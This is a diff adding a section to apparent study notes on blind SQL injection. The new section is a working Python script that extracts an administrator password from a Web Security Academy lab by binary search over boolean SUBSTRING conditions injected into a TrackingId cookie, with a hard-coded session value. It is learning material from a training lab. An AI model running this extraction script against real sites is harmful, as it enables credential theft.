@@ -152,6 +152,45 @@ if the message "Welcome" is displayed, then the first letter has a greater value
 
 The ~SUBSTRING~ SQL command is used to extract some characters from a string, the command takes in 3 arguments: string, start and length. The start argument is from what position to extract the string where 1 is the first character. This method can be automated to extract the password one letter at a time.
 
+*** Binary Search Example
+[[id:30ae3a30-714f-45a6-b862-9bfd58c8176d][Binary search]] can be used to extract a password, given the username. The following code was used to solve the blind SQL injection lab using conditional queries.
+#+begin_src python
+import time
+import requests
+import string
+
+sorted_strings = sorted(string.digits + string.ascii_letters + string.punctuation)
+
+print(sorted_strings)
+
+password = ""
+tracking_id = 'X7pxJhlb6LuMDX3h'
+session = 'avrtwSPhS91N2poWOl1pyVbULqrLuDVI'
+cookies = {'session':session}
+url = 'https://0aee00650346b9ccc0991cd400c0009b.web-security-academy.net'
+
+for i in range(1,51):
+    tmp_strings = sorted_strings
+    print("Current index", i)
+    while(len(tmp_strings)):
+        s = tmp_strings[len(tmp_strings)//2]
+        if (len(tmp_strings) == 1):
+            password += s
+            print("Current password", password)
+            break
+        payload = f"{tracking_id}' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),{i},1) >= '{s}'--"
+        cookies['TrackingId'] = payload
+        print(cookies)
+        resp = requests.get(f"{url}/filter?category=Pets",cookies=cookies)
+        if "Welcome" in resp.text:
+            tmp_strings = tmp_strings[len(tmp_strings)//2:]
+        else:
+            tmp_strings = tmp_strings[:len(tmp_strings)//2]
+        time.sleep(0.3)
+
+print("administrator password is", password)
+#+end_src
+
 ** SQL Errors
 If the behavior of the application is the same when injecting Boolean conditions, then causing the database to throw an error if a condition is true might be fruitful since some application do not handle [[id:5b33d78a-58bb-4df4-af2d-ac8eced7fe2e][SQL]] errors thrown by the database, leaking information by accident.
 
